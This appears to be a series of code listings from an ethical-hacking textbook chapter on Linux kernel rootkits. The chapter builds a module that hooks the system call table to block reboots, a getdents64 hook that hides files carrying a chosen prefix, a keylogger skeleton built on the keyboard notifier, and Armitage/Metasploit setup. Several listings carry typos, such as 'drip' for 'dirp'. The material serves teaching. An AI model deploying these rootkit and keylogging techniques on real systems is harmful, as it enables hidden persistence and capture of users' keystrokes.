["```\nkali@kali:~/Desktop/lkm_rootkit$ touch hello.c Makefile\n```", "```\n   #include <linux/module.h>\n\n   #include <linux/kernel.h>\n➊ static int startup(void){\n\n    ➋ printk(➌ KERN_NOTICE  \"Hello, Kernel Reporting for Duty!\\n\");\n\n       return 0;\n\n   }\n➍ static void shutdown(void){\n\n      printk(KERN_NOTICE \"Bye bye!\\n\");\n\n   }\n➎ module_init(startup);\n➏ module_exit(shutdown);\n\n   MODULE_LICENSE(\"GPL\");\n```", "```\n➊ obj-m += hello.o\n\n   all:\n\n   ➋ make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\n   clean:\n\n      make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo apt install linux-headers-$(uname -r)\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ make\nmake -C /lib/modules/5.4.0-kali4-amd64/build M=/home/kali/lkm_rootkit modules\nmake[1]: Entering directory '/usr/src/linux-headers-5.4.0-kali4-amd64'\n\n  CC [M]  /home/kali/lkm_rootkit/hello.o\n\n  Building modules, stage 2.\n\n  MODPOST 1 modules\n\n  CC [M]  /home/kali/lkm_rootkit/hello.mod.o\n\n  LD [M]  /home/kali/lkm_rootkit/hello.ko\nmake[1]: Leaving directory '/usr/src/linux-headers-5.4.0-kali4-amd64'\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo insmod hello.ko\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo dmesg\n\n[    0.000000] Linux version 5.7.0-kali1-amd64 (devel@kali.org) (gcc version\n\n\t\t\t 9.3.0 (Debian 9.3.0-14), GNU ld (GNU Binutils for Debian) 2.34) #1 SMP\n\n\t\t\t Debian 5.7.6-1kali2\n\n[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-5.7.0-kali1-amd64 root=\n\n\t\t\t UUID=b1ce2f1a-ef90-47cd-ac50-0556d1ef12e1 ro quiet splash\n\n[    0.000000] x86/fpu: x87 FPU will use FXSAVE\n\n[    0.000000] BIOS-provided physical RAM map:\n\n...\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo dmesg | grep 'Hello'\n\n[ 2396.487566] Hello, Kernel Reporting for Duty!\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo dmesg | tail\n```", "```\n kali@kali:~/Desktop/lkm_rootkit$ sudo lsmod\n\n   Module                  Size  Used by\n➊ hello                  16384  0\n\n   fuse                  139264  5\n\n   rfkill                 28672  2\n\n   vboxsf                 94208  0\n\n   joydev                 28672  0\n\n   snd_intel8x0           49152  2\n\n   snd_ac97_codec        155648  1 snd_intel8x0\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo rmmod hello\n```", "```\n#include <stdio.h>\n\n#include <stdlib.h>\n\nint main(){\n\n   FILE *fptr = fopen(\"/tmp/file.txt\",\"w\");\n\n   fprintf(fptr,\"%d\",7);\n\n   fclose(fptr);\n\n   return 0;\n\n}\n```", "```\n   <__close>:\n\n   ...\n➊ mov $0x03,%eax\n➋ syscall\n➌ cmp $0xfffffffffffff001,%rax\n\n   ...\n➍ retq\n```", "```\n   kali@kali:~/Desktop/lkm_rootkit$ sudo find / -iname unistd_64.h\n\n   /usr/src/linux-headers-5.7.0-kali1-common/arch/sh/include/uapi/asm/unistd_64.h\n\n   /usr/src/linux-headers-5.7.0-kali1-amd64/arch/x86/include/generated/uapi/asm/\n\n\t\t\t unistd_64.h\n➊ /usr/include/x86_64-linux-gnu/asm/unistd_64.h\n```", "```\n   kali@kali:~/Desktop/lkm_rootkit$ cat /usr/include/x86_64-linux-gnu/asm/\n\n\t\t\t unistd_64.h\n   #ifndef _ASM_X86_UNISTD_64_H\n\n   #define _ASM_X86_UNISTD_64_H 1\n\n   #define __NR_read 0\n\n   #define __NR_write 1\n\n   #define __NR_open 2\n➊ #define __NR_close 3\n\n   #define __NR_stat 4\n\n   ...\n```", "```\nunsigned long *sys_call_table_address = kallsyms_lookup_name(\"sys_call_table\");\n```", "```\nstatic long my_write_cr0(long value) {\n\n    __asm__ volatile(\"mov %0, %%cr0\" :: \"r\"(value) : \"memory\");\n\n}\n```", "```\n#define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000);\n```", "```\n#define enable_write_protection()({my_write_cr0(read_cr0() | (0x10000));})\n```", "```\nstatic void hook_reboot_sys_call(void *new_function){\n\n ➊ old_reboot_sys_call = sys_call_table_address[__NR_reboot];\n\n    disable_write_protection();\n\n ➋ sys_call_table_address[__NR_reboot] = (unsigned long)new_function;\n\n    enable_write_protection();\n\n}\n```", "```\n  #include <linux/module.h>\n\n  #include <linux/init.h>\n\n  #include <linux/kernel.h>\n\n  #include <linux/kprobes.h>\n\n  #include <linux/syscalls.h>\n\n  // Manually set the write bit\n\n  static void my_write_cr0(long value) {\n\n      __asm__ volatile(\"mov %0, %%cr0\" :: \"r\"(value) : \"memory\");\n\n  }\n\n  #define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000))\n\n  #define enable_write_protection() my_write_cr0(read_cr0() | (0x10000))\n\n  #define enable_reboot 0\n\n  unsigned long *sys_call_table_address;\n\n  asmlinkage int (*old_reboot_sys_call)(int, int, int, void*);\n\n  static struct kprobe kp = {\n\n      .symbol_name = \"kallsyms_lookup_name\"\n\n  };\n\n  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n\n  unsigned long * get_system_call_table_address(void){\n\n      kallsyms_lookup_name_t kallsyms_lookup_name;\n\n      register_kprobe(&kp);\n\n      kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n\n      unregister_kprobe(&kp);\n\n  unsigned long *address = (unsigned long*)kallsyms_lookup_name(\"sys_call_table\");\n\n      return address;\n\n  }\n\n  asmlinkage int hackers_reboot(int magic1, int magic2, int cmd, void *arg){\n\n      if(enable_reboot){\n\n         return old_reboot_sys_call(magic1, magic2, cmd, arg);\n\n      }\n\n      printk(KERN_NOTICE \"EHROOTKIT: Blocked reboot Call\");\n\n      return EPERM;\n\n  }\n\n➊ void hook_sys_call(void){\n\n      old_reboot_sys_call = sys_call_table_address[__NR_reboot];\n\n      disable_write_protection();\n\n      sys_call_table_address[__NR_reboot] = (unsigned long) hackers_reboot;\n\n      enable_write_protection();\n\n      printk(KERN_NOTICE \"EHROOTKIT: Hooked reboot Call\");\n\n  }\n\n➋ void restore_reboot_sys_call(void){\n\n      disable_write_protection();\n\n      sys_call_table_address[__NR_reboot] = (unsigned long) old_reboot_sys_call;\n\n      enable_write_protection();\n\n  }\n\n  static int startup(void){\n\n      sys_call_table_address = get_system_call_table_address();\n\n      hook_sys_call();\n\n      return 0;\n\n  }\n\n  static void __exit shutdown(void){\n\n     restore_reboot_sys_call();\n\n  }\n\n  module_init(startup);\n\n  module_exit(shutdown);\n\n  MODULE_LICENSE(\"GPL\");\n```", "```\nSYSCALL_DEFINE4(reboot, int, magic1, int, magic2, unsigned int, cmd,\n\n      void __user *, arg)\n\n{\n\n...\n\n   /* We only trust the superuser with rebooting the system. */\n\n   if (!ns_capable(pid_ns->user_ns, CAP_SYS_BOOT))\n\n      return -EPERM;\n\n   /* For safety, we require \"magic\" arguments. */\n\n ➊ if (magic1 != LINUX_REBOOT_MAGIC1 ||\n\n         (magic2 != LINUX_REBOOT_MAGIC2 && ➋ \n\n         magic2 != LINUX_REBOOT_MAGIC2A &&\n\n...\n```", "```\nLINUX_REBOOT_MAGIC1  4276215469  = 0xfee1dead\nLINUX_REBOOT_MAGIC2  672274793   = 0x28121969 (Linus Birthday)\nLINUX_REBOOT_MAGIC2A 85072278    = 0x05121996 (Birthday Kid 1)\nLINUX_REBOOT_MAGIC2B 369367448   = 0x16041998 (Birthday Kid 2)\nLINUX_REBOOT_MAGIC2C 537993216   = 0x20112000 (Birthday Kid 3)\n```", "```\nobj-m += reboot_blocker.o\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo insmod reboot_blocker.ko\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo dmesg | grep 'EHROOTKIT'\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ sudo reboot\n```", "```\nkali@kali:~/Desktop/lkm_rootkit$ ping <Kali IP address>\n```", "```\nlong getdents64(\n\n                  unsigned int fd,\n\n                  struct linux_dirent64 *dirp,\n\n                  unsigned int count\n\n             );\n```", "```\nstruct linux_dirent64 {\n\n            ino64_t        d_ino;\n\n            off64_t        d_off;\n\n            unsigned short d_reclen;\n\n            unsigned char  d_type;\n\n            char           d_name[];\n\n        };\n```", "```\n#define PREFIX \"eh_hacker_\"\n\n#define PREFIX_LEN 10\nasmlinkage hacker_getdents64( unsigned int fd, struct linux_dirent64 *dirp,\n\n\t\t\t unsigned int count){\n➊ int num_bytes = old_getdents64(fd,dirp, count);\n\n   struct linux_dirent64* entry = NULL;\n\n   int offset = 0;\n➋ while( offset < num_bytes){\n\n       unsigned long entry_addr = drip + offset;\n\n       entry = (struct linux_dirent*) entry_addr;\n\n    ➌ if (strncmp(entry->d_name, PREFIX, PREFIX_LEN) != 0){\n\n               offset += entry->d_reclen;\n\n        }else{\n\n          ➍ size_t bytes_remaining = num_bytes - (offset + entry->d_reclen);\n\n             memcpy(entry_addr, entry_addr + entry->d_reclen, bytes_remaining);\n\n             num_bytes -= entry->d_reclen;\n\n             count -= 1;\n\n        }\n\n    }\n\n    return num_bytes;\n\n}\n```", "```\nkali@kali:~$ sudo apt-get install armitage\n```", "```\nkali@kali:~$ sudo service postgresql start\n```", "```\nkali@kali:~$ sudo msfdb init\n\n[i] Database already started\n\n[+] Creating database user 'msf'\n\n[+] Creating databases 'msf'\n\n[+] Creating databases 'msf_test'\n```", "```\nkali@kali:~$ sudo armitage &\n```", "```\nstatic const char* keymap[] = { \"\\0\", \"ESC\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\"\n\n\t\t\t , \"8\", \"9\", \"0\", \"-\", \"=\", \"_BACKSPACE_\", \"_TAB_\",\n\n                        \"q\", \"w\", \"e\", \"r\", \"t\", \"y\", \"u\", \"i\", \"o\", \"p\", \"[\",\n\n\t\t\t \"]\", \"_ENTER_\", \"_CTRL_\", \"a\", \"s\", \"d\", \"f\",\n\n                        \"g\", \"h\", \"j\", \"k\", \"l\", \";\", \"'\", \"`\", \"_SHIFT_\", \"\\\\\"\n\n\t\t\t![image](../images/arrow01.jpg)\n\t\t\t , \"z\", \"x\", \"c\", \"v\", \"b\", \"n\", \"m\", \",\", \".\"};\n```", "```\nkali@kali:~$ sudo showkey --keycode\npress any key (program terminates 10s after last keypress)...\nkeycode  28 release\nkeycode   2 press\nkeycode   2 release\nkeycode  35 press\nkeycode  35 release\nkeycode  48 press\nkeycode  48 release\n```", "```\nstatic int __init start(void)\n\n{\n\n   register_keyboard_notifier(&nb);\n\n   printk(KERN_INFO \"Keyboard Module Loaded!\\n\");\n\n   return 0;\n\n}\nstatic void __exit end(void)\n\n{\n\n   unregister_keyboard_notifier(&nb);\n\n   printk(KERN_INFO \"Module Unloaded!\\n\");\n\n}\n```", "```\nstatic struct notifier_block nb = {\n\n ➊.notifier_call =  ➋ notify_keypress\n\n};\n```", "```\nint notify_keypress(struct notifier_block *nb, unsigned long code, void\n\n\t\t\t *_param)\n\n{\n\n ➊ struct keyboard_notifier_param *param;\n\n    param = _param;\n\n    if(code == KBD_KEYCODE)\n\n    {\n\n       if(param->down)\n\n       {\n\n        /*-----------------------*/\n\n        /* Place your code here */\n\n        /*----------------------*/\n\n       }\n\n    }\n\n    return NOTIFY_OK;\n\n}\n```", "```\nstruct keyboard_notifier_param {\n\n   struct vc_data *vc;\n\n ➊ int down;\n\n    int shift;\n\n    int ledstate;\n\n ➋ unsigned int value;\n\n};\n```"]